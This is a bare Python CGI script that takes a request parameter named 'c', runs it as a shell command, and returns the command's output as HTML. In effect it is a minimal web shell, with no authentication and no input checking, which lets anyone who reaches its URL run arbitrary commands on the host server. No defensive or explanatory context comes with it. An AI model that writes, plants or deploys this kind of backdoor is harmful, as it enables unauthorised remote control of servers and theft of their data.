#!/usr/bin/python3

import cgi

print("Content-type:text/html")
print()

form = cgi.FieldStorage()
data=form.getvalue("c")

import subprocess as s
out=s.getoutput(data)
print("<pre>")
print(out)
print("</pre>")